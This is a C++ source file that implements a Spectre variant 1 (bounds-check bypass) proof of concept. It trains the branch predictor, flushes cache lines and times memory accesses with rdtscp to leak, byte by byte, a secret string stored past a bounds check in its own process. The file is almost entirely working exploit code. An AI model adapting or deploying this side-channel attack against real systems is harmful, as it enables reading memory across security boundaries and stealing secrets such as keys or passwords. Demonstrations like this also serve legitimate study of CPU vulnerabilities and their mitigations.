#include <memory>
#include <array>
#include <chrono>
#include <iostream>
#include <numeric>
#include <stdlib.h>
#include <string.h>
#include <string.h>
#include <string>
#include <tuple>
#include <x86intrin.h>

#define PAGE_SIZE 16384

namespace {

void access_memory(const void* p) { __asm__ __volatile__ ( "" : : "r"(*static_cast<const uint8_t*>(p)) : "memory" ); }

long get_time() {
#if 1
    unsigned int i;
    return __rdtscp(&i);
#else 
    return std::chrono::duration_cast<std::chrono::nanoseconds>(std::chrono::high_resolution_clock::now().time_since_epoch()).count();
#endif // 0 
}



void score_latencies(const std::array<long, 256>& latencies, std::array<int, 256>& scores, size_t& ok_index) {
    double avg = 0;
    for(int q = 0;q < 256;q++) {
        avg += latencies[q] / 255;
    }
    avg -= latencies[ok_index] / 255;

    for(int q = 0;q < 256;q++) {
        if(q != ok_index && latencies[q] < avg / 2) {
            scores[q]++;
        }
    }
}

std::pair<size_t, size_t> best_scores(const std::array<int, 256>& scores) {
    std::size_t i1 = 0,i2 = 1;
    if(scores[i1] < scores[i2]) std::swap(i1,i2);
    for(int q = 2;q < 256;q++) {
        if(scores[q] > scores[i2]) {
            i2 = q;
            if(scores[i1] < scores[i2]) {
                std::swap(i1,i2);
            } 
        }
    }    
    return {i1,i2};
}

class timing_array_type {
    char s[1024];
};

char spectre_attack(const char* data, size_t size, size_t evil_index) {
    timing_array_type timing_array[256];
    memset(timing_array, 1, sizeof(timing_array_type) * 256);
    std::array<long, 256> timing = {};
    std::array<int, 256> scores = {};
    std::size_t* data_size = new std::size_t();
    *data_size = size;

    for(int q = 0;q < 1000;q++) {
        std::size_t ok_index = q % size;

        for(int w = 0;w < 256;w++) {
            _mm_clflush(timing_array + w);
        }

        for(int w = 0;w < 500;w++) {
            _mm_clflush(&*data_size);
            for(volatile int e = 0;e < 1000;e++) {}
            std::size_t i_index = (w & 0xf) ? ok_index : evil_index;
            if(i_index < *data_size) {
                access_memory(timing_array + data[i_index]);
            }
        }

        for(int w = 0;w < 256;w++) {
            std::size_t i_rand = ((w * 167) + 13) & 0xff;
            const timing_array_type* const p = timing_array + i_rand;
            auto t0 = get_time();
            access_memory(p);
            timing[i_rand] = get_time() - t0;
        }

        score_latencies(timing,scores,ok_index);
        std::pair<std::size_t, std::size_t> res = best_scores(scores);
        if(scores[res.first] >= scores[res.second] * 2 + 100) return res.first;
    }  
    for(int q = 0;q < 256;q++) {
        std::cout << scores[q] << " ";
    }
    std::cout << "Error occur" << std::endl;
    return best_scores(scores).first;
}

char* allocate_aligned(size_t alignment, size_t size) {
    void* p;
    if (posix_memalign(&p, alignment, size)) return nullptr;
    return static_cast<char*>(p);
}

} // namespace

int main() {
    char* const data = allocate_aligned(PAGE_SIZE, PAGE_SIZE*2);
    strcpy(data, "markthitrin");
    strcpy(data + PAGE_SIZE, "Hello world, this shoudlnt' be happening");
    for(int q = 0;q < PAGE_SIZE;q++) {
        char c = spectre_attack(data,strlen(data) + 1,PAGE_SIZE + q);
        if(!c) break;
        std::cout << c << std::flush;
    }
    std::cout << std::endl;
    free(data);
}